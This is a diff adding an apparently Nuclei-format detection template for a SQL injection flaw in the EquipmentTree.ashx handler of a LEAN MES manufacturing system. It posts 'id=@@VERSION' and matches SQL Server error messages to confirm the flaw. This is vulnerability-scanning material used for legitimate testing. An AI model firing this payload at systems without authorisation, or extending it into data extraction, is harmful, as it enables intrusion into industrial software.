@@ -1,0 +1,28 @@
+id: poc-yaml-skt-lean-mes-equipmenttree-sqli
+info:
+  name: 深科特 LEAN MES系统 EquipmentTree.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/Handler/EquipmentTree.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: "id=@@VERSION"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Microsoft SQL Server"
+          - "[SqlException]:"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+        part: body
